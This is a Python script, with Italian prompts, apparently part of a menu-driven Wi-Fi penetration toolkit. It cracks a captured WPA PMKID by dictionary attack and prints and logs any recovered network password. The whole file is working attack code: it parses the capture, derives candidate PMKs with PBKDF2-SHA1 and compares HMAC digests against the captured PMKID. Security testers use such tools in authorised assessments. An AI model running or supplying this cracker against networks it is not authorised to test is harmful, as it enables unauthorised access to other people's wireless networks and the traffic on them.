#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Crack PMKID using a wordlist.
Logs progress and result.
"""

import hashlib
import hmac
import struct
import os
import sys
from datetime import datetime

LOG_FILE = "wifi_pen.log"

def log_message(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

def main():
    log_message("=== CRACK PMKID START ===")
    passlist_path = "passlist.txt"

    # Leggi hashline
    try:
        with open("hashline.txt", 'r') as f:
            hashline = f.read().splitlines()[0]
    except:
        log_message("hashline.txt not found")
        print("❌ File hashline.txt non trovato. Esegui prima Capture PMKID.")
        input("\nPremi ENTER per tornare al menu.")
        return

    hl = hashline.split('*')
    if len(hl) < 6:
        log_message("Invalid hashline format")
        print("❌ Formato hashline non valido.")
        input("\nPremi ENTER per tornare al menu.")
        return

    pmkid = hl[2]
    mac_ap = bytes.fromhex(hl[3])
    mac_cl = bytes.fromhex(hl[4])
    essid = bytes.fromhex(hl[5])

    # Leggi wordlist
    if not os.path.exists(passlist_path):
        log_message("passlist.txt not found")
        print("❌ File passlist.txt non trovato. Usa quello fornito.")
        input("\nPremi ENTER per tornare al menu.")
        return

    with open(passlist_path, 'r') as f:
        wordlist = [line.strip() for line in f if line.strip()]

    log_message(f"Wordlist loaded: {len(wordlist)} passwords")
    print(f"\n🔍 Cracking PMKID per SSID: {essid.decode()}")
    print(f"   PMKID: {pmkid}")
    print(f"   MAC AP: {mac_ap.hex()}")
    print(f"   MAC Client: {mac_cl.hex()}")
    print(f"   Wordlist: {len(wordlist)} tentativi\n")

    found = False
    for idx, pwd in enumerate(wordlist):
        pmk = hashlib.pbkdf2_hmac('sha1', pwd.encode(), essid, 4096, 32)
        try_pmkid = hmac.digest(pmk, b"PMK Name" + mac_ap + mac_cl, hashlib.sha1).hex()[0:32]
        if try_pmkid == pmkid:
            found = True
            log_message(f"PASSWORD FOUND: {pwd}")
            print(f"\n✅ PASSWORD TROVATA: {pwd}")
            print(f"   SSID: {essid.decode()}")
            print(f"   Password: {pwd}\n")
            break
        # Mostra progresso ogni 100 tentativi
        if (idx + 1) % 100 == 0:
            print(f"   Progresso: {idx+1}/{len(wordlist)} ...")

    if not found:
        log_message("Password not found in wordlist")
        print("\n❌ Password non trovata nella wordlist.")
        print("   Prova con una lista più grande.")

    log_message("=== CRACK PMKID END ===")
    input("\nPremi ENTER per tornare al menu.")

if __name__ == "__main__":
    main()